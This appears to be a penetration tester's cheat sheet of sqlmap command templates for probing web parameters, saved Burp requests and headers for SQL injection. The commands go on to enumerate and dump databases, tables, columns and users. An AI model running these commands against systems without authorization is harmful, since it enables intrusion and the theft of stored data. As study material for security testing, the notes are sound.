## SQLMap
	sqlmap -u [url] --tables
	sqlmap -u [url] --current-db [database] --dump
	sqlmap -u [url] --current-db [database] --columns
### GET (url with param)
	sqlmap -u [url] -p [parameter] --technique=[Technique]
	sqlmap -u [url] -p [parameter] --technique=[Technique] --banner -v3 --fresh-queries
	sqlmap -u [url] -p [parameter] --technique=[Technique] --users
	sqlmap -u [url] -p [parameter] --technique=[Technique] --dbs
	sqlmap -u [url] -p [parameter] --technique=[Technique] -D [database] --tables
	sqlmap -u [url] -p [parameter] --technique=[Technique] -D [database] -T [table] --columns
	sqlmap -u [url] -p [parameter] --technique=[Technique] -D [database] -T [table] -C [columns] --dump

### POST (url without param)
	right click burp resquest and "save to file" [file].req
	sqlmap -r [request file] -p [param] --technique [technique]

	or

	sqlmap -u [url] --data [post login data] -p [param] --technique [technique] --banner
	sqlmap -u [url] --data [post login data] -p [param] --technique [technique] --dbs


### Notes
	--headers="X-forwarded-for:1*"